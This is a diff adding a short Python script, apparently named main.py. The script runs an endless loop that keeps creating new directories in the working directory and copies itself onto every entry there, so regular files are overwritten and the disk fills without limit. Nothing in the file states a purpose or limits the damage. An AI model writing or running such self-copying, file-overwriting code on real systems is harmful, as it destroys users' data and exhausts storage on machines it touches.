@@ -1,0 +1,17 @@
+import os, shutil
+import time
+
+sep = "\\" if os.name == "nt" else "/"
+cwd = os.getcwd()
+
+count = 0
+
+while True:
+    time.sleep(1)
+    os.mkdir(f"{cwd}{sep}test{count}")
+    count += 1
+
+    for dir in os.listdir(f"{cwd}"):
+        time.sleep(1)
+        shutil.copy(f"{cwd}{sep}main.py", dir)
+    
